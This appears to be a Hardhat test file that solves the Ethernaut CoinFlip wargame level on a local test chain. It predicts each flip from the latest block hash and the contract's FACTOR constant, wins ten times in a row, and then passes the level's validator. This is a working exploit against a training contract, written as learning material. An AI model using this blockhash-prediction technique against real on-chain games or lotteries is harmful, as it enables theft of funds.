import { expect } from "chai";
import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { BigNumber } from "ethers";

const FACTOR = BigNumber.from("57896044618658097711785492504343953926634992332820282019728792003956564819968");

describe("CoinFlip exploit", () => {
  async function deployCoinFlipFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const CoinFlipFactory = await ethers.getContractFactory("CoinFlipFactory");
    const coinFlipFactory = await CoinFlipFactory.connect(deployer).deploy();

    // Simulate execution of createInstance to get return value of the function(address of deployed instance)
    const coinFlipAddress = await coinFlipFactory.callStatic.createInstance(attacker.address);

    const tx = await coinFlipFactory.createInstance(attacker.address);
    await tx.wait();

    // Load the instance at returned address
    const coinFlip = await ethers.getContractAt("CoinFlip", coinFlipAddress);

    return { attacker, coinFlip, coinFlipFactory };
  }

  it("Should guess the correct outcome 10 times in a row", async () => {
    const { attacker, coinFlip, coinFlipFactory } = await loadFixture(deployCoinFlipFixture);

    for (let i = 0; i < 10; i++) {
      const guess = await computeGuess();
      const tx = await coinFlip.connect(attacker).flip(guess);
      await tx.wait();
    }

    expect(await coinFlip.consecutiveWins()).to.be.equal("10", "Did not win consecutively");

    // Validate instance using Ethernaut validation
    const success = await coinFlipFactory.validateInstance(coinFlip.address, attacker.address);
    expect(success).to.be.true;
  });
});

async function computeGuess(): Promise<boolean> {
  const latestBlockNumber = await ethers.provider.getBlockNumber();
  const blockhash = (await ethers.provider.getBlock(latestBlockNumber)).hash;
  const blockValue = BigNumber.from(blockhash);
  const coinFlip = blockValue.div(FACTOR);
  console.log(`Block : ${latestBlockNumber} ${coinFlip.eq(1)}`);
  return new Promise((resolve) => resolve(coinFlip.eq(1)));
}
